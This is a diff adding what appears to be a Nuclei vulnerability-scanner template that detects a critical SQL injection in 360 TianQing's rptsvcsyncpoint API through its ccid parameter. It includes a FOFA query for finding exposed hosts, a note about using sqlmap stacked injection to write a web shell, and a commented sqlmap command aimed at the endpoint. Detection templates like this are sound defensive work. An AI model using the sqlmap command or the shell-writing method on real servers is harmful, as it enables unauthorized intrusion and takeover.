@@ -1,0 +1,26 @@
+id: 360-tianqing-ccid-sql-injectable
+
+info:
+  name: 360 TianQing ccid SQL injectable
+  author: SleepingBag945
+  severity: critical
+  description: |
+    The attacker can get the server permission by injecting SQL into the upload Trojan,可使用sqlmap堆叠注入写shell
+  metadata:
+    fofa-query: app="360新天擎"
+
+http:
+  - raw:
+      - |
+        GET /api/dp/rptsvcsyncpoint?ccid=1  HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1,"result") && contains(body_1,"success") && !contains(body_1,"10001")'
+        condition: and
+
+#python sqlmap.py -u https://x.x.x.x:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
